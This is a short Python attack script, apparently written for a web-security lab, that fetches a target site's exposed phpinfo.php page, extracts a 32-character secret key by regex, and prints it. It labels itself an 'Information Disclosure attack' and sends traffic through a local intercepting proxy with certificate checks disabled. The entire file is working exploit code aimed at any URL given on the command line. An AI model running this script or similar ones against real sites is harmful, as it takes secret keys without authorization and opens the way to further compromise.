import requests
import sys
import urllib3
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_secret_key(url, session):
    phpinfo_url = url + "/cgi-bin/phpinfo.php"
    response = session.get(
        phpinfo_url,
        verify=False,
        proxies=proxies)
    if (response.status_code == 200):
        secret_key = re.search(
            '[0-9a-zA-Z]{32} ',response.text)[0]
        return secret_key
    raise ValueError("Could not exploit vulnerabilty.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Information Disclosure attack...")
        secret_key = get_secret_key(url, session)
        print("[+] The secret key is '%s'" % secret_key)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Information Disclosure attack was not successful.")
        sys.exit(FAIL) 